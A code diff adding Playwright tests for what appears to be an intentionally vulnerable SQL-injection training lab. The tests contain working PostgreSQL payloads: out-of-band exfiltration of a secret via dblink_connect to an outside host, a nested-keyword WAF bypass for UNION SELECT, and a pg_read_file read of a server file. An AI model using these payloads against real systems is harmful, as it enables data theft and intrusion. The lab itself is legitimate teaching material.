@@ -241,6 +241,86 @@ test.describe('Level 2-2: Time-Based Blind SQLi', () => {
   })
 })
 
+test.describe('Level 3-1: Out-of-Band SQLi via dblink_connect', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/oob')
+  })
+
+  test('step 1 - numeric id returns scout (injection point confirmed)', async ({ page }) => {
+    await page.fill('.search-bar input', '1')
+    await page.click('.search-btn')
+    await expect(page.locator('.entries-table tbody tr').first()).toBeVisible()
+  })
+
+  test('step 2 - dblink_connect payload triggers congrats banner with link to /waf', async ({ page }) => {
+    await page.fill('.search-bar input', "1 AND dblink_connect('host=host.docker.internal port=9000 dbname=postgres user=' || (SELECT segredo FROM oob_relatorio_secreto LIMIT 1) || ' password=x sslmode=disable') IS NOT NULL")
+    await page.click('.search-btn')
+    await expect(page.locator('.congrats-31')).toBeVisible()
+    await expect(page.locator('.congrats-31 .congrats-next')).toHaveAttribute('href', '/waf')
+  })
+})
+
+test.describe('Level 3-2: WAF Bypass via Keyword Nesting', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/waf')
+  })
+
+  test('step 1 - normal query returns scouts by nivel', async ({ page }) => {
+    await page.fill('.search-bar input', '8')
+    await page.click('.search-btn')
+    await expect(page.locator('.entries-table tbody tr').first()).toBeVisible()
+  })
+
+  test('step 2 - raw union/select is stripped by WAF (no flag in result)', async ({ page }) => {
+    await page.fill('.search-bar input', '0 union select segredo from waf_palavras_chave')
+    await page.click('.search-btn')
+    const rows = page.locator('.entries-table tbody tr')
+    const count = await rows.count()
+    if (count > 0) {
+      await expect(page.locator('.entries-table')).not.toContainText('JUMENTOS{')
+    }
+    await expect(page.locator('.congrats-32')).not.toBeVisible()
+  })
+
+  test('step 3 - single nesting (bypass(1)) still stripped by two-pass WAF', async ({ page }) => {
+    await page.fill('.search-bar input', '-1 uniunionon selselectect segredo frfromom waf_palavras_chave')
+    await page.click('.search-btn')
+    const rows = page.locator('.entries-table tbody tr')
+    const count = await rows.count()
+    if (count > 0) {
+      await expect(page.locator('.entries-table')).not.toContainText('JUMENTOS{')
+    }
+    await expect(page.locator('.congrats-32')).not.toBeVisible()
+  })
+
+  test('step 4 - bypass(2) double nesting extracts flag and triggers congrats with link to /secrets', async ({ page }) => {
+    await page.fill('.search-bar input', '-1 unununionionion selselselectectect segredo frfrfromomom waf_palavras_chave')
+    await page.click('.search-btn')
+    await expect(page.locator('.entries-table')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-32')).toBeVisible()
+    await expect(page.locator('.congrats-32 .congrats-next')).toHaveAttribute('href', '/secrets')
+  })
+})
+
+test.describe('Level 3-3: File Read via pg_read_file', () => {
+  test.beforeEach(async ({ page }) => {
+    await page.goto('/secrets')
+  })
+
+  test('step 1 - normal query returns config value', async ({ page }) => {
+    await page.fill('.search-bar input', 'db_version')
+    await page.click('.search-btn')
+    await expect(page.locator('.result-valor')).toContainText('PostgreSQL')
+  })
+
+  test('step 2 - UNION pg_read_file reads flag file and triggers congrats', async ({ page }) => {
+    await page.fill('.search-bar input', "' UNION SELECT pg_read_file('/secrets/flag.txt')--")
+    await page.click('.search-btn')
+    await expect(page.locator('.result-valor')).toContainText('JUMENTOS{')
+    await expect(page.locator('.congrats-33')).toBeVisible()
+  })
+})
+
 test.describe('Level 2-3: Second-Order (Stored) SQLi', () => {
   test.beforeEach(async ({ page }) => {
     await page.goto('/tickets')
